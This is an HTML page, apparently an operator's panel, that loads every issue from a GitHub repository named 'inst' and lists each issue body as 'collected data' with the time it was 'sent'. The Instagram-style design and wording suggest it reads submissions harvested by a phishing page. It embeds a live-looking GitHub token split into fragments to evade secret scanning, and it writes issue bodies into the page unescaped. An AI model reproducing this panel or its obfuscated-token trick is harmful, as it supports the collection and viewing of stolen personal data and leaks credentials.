<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<title>보안 관리자 패널</title>
<style>
  body { font-family: -apple-system, "Malgun Gothic", sans-serif; background: #fafafa; padding: 20px; margin: 0; }
  .container { max-width: 800px; margin: auto; }
  h1 { text-align: center; font-weight: 300; color: #262626; border-bottom: 1px solid #dbdbdb; padding-bottom: 20px; }
  
  .card { background: white; padding: 20px; border: 1px solid #dbdbdb; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
  .date { font-size: 12px; color: #8e8e8e; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
  .info-row { font-size: 15px; margin: 5px 0; color: #262626; }
  .label { font-weight: bold; color: #0095f6; margin-right: 10px; }
  
  #status-msg { text-align: center; color: #8e8e8e; margin-top: 20px; }
  .refresh-btn { display: block; margin: 0 auto 20px; padding: 8px 16px; background: #0095f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
</style>
</head>
<body>

  <div class="container">
    <h1>수집된 데이터 리스트</h1>
    <button class="refresh-btn" onclick="loadData()">새로고침</button>
    <div id="list">데이터를 불러오는 중...</div>
  </div>

  <script>
    async function loadData() {
      const listDiv = document.getElementById('list');
      
      // 토큰 및 저장소 정보 (저장소 이름: inst)
      const s1="ghp_", s2="kXWuJyvOxUus", s3="FDwMLjRi5Q7I", s4="eZLaf83K", s5="Zz9N";
      const TOKEN = s1+s2+s3+s4+s5;
      const REPO = "paparata080-create/inst"; 

      try {
        const res = await fetch(`https://api.github.com/repos/${REPO}/issues?state=all`, {
          headers: { 'Authorization': `token ${TOKEN}` }
        });

        if (!res.ok) {
           listDiv.innerHTML = `<div id="status-msg">오류 발생: ${res.status} (토큰이나 저장소 이름을 확인하세요)</div>`;
           return;
        }

        const data = await res.json();
        listDiv.innerHTML = "";

        if (data.length === 0) {
          listDiv.innerHTML = '<div id="status-msg">수집된 데이터가 없습니다.</div>';
          return;
        }

        // 최신순으로 정렬하여 표시
        data.forEach(item => {
          const card = document.createElement('div');
          card.className = 'card';
          
          // 전송된 시간을 한국 시간으로 변환
          const localTime = new Date(item.created_at).toLocaleString('ko-KR');
          
          card.innerHTML = `
            <div class="date">수집 시간: ${localTime}</div>
            <div class="info-row"><span class="label">내용:</span><br>${item.body.replace(/\n/g, '<br>')}</div>
          `;
          listDiv.appendChild(card);
        });
      } catch (e) {
        listDiv.innerHTML = '<div id="status-msg">데이터를 불러오는 데 실패했습니다.</div>';
      }
    }

    // 페이지 로드 시 즉시 실행
    loadData();
  </script>

</body>
</html>
